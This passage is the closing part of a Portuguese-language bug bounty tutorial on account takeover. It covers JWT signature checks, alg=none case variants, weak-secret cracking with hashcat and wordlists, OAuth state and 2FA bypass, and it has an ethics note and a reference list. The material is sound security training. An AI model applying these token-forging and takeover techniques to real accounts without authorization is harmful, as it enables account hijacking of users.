- **Achar um `eyJ` ≠ bug.** Um JWT existir é normal. Bug é a **assinatura não ser verificada** ou o segredo ser fraco. Sempre teste a verificação.
- **"Secret key" no JS quase nunca é segredo.** Variáveis `VUE_APP_*`, `pk_live_` do Stripe, sitekeys de reCAPTCHA são **públicas por design**. O que importa é um token/credencial **realmente sensível** (use o [KeyHacks](https://github.com/streaak/keyhacks) pra validar).
- **Tomar a própria conta de um jeito esquisito não é report.** O programa quer ver "**atacante → vítima**". Sem a segunda conta e sem escala, o impacto fica fraco.
- **JWT decodificado ≠ JWT quebrado.** Editar o payload no jwt.io é trivial; só vira ATO se o servidor **aceitar** a assinatura forjada. Sempre confirme contra o servidor.
- **`alg=none` rejeitado num formato** pode passar em outro: teste `none`, `None`, `nOnE`, `NONE`.

## O que você precisa lembrar

- **ATO é resultado, não uma falha única**: reset inseguro, refresh frouxo, JWT forjável, OAuth sem `state`, 2FA contornável, todos levam ao mesmo lugar.
- **A pergunta-mestra:** *"qual dado dessa request decide quem eu sou, e eu consigo mexer nele?"*
- **Em JWT, toda a segurança está na verificação da assinatura.** Allowlist de algoritmo + chave forte mata a maioria dos ataques.
- **O dinheiro está na escala:** "qualquer atacante toma qualquer conta" = crítico.

> 💡 **Dica de ouro:** sempre teste com **duas contas** e foque no **fluxo de identidade** (reset, refresh, token, OAuth, 2FA). Se você consegue se passar por outro usuário sem saber a senha dele (e prova que isso vale pra **qualquer** conta), você tem um ATO crítico nas mãos.

## Nota ética

Tudo aqui é pra **testes autorizados**: bug bounty dentro do escopo, pentests contratados e labs legais. Forjar tokens, resetar senhas ou contornar 2FA em sistemas de terceiros sem autorização é crime, e desnecessário quando existem labs excelentes (PortSwigger Academy, THM, HTB) pra treinar exatamente esses ataques. Use pra proteger, reportar com responsabilidade e ensinar, nunca pra invadir.

## Referências

- [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/2021/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt) e [Algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [PortSwigger — OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth) e [Authentication](https://portswigger.net/web-security/authentication)
- [hashcat — example hashes (modo 16500 = JWT)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [jwt.io — debugger e introdução](https://jwt.io/introduction)
- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) · [wallarm/jwt-secrets (wordlists)](https://github.com/wallarm/jwt-secrets)

---
*Anterior na série: [Broken Access Control — IDOR, BOLA e BFLA](/posts/broken-access-control-idor-bola-bfla/) · base: [Recon & Discovery](/posts/recon-discovery/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)**, o índice da série, do básico ao avançado.*
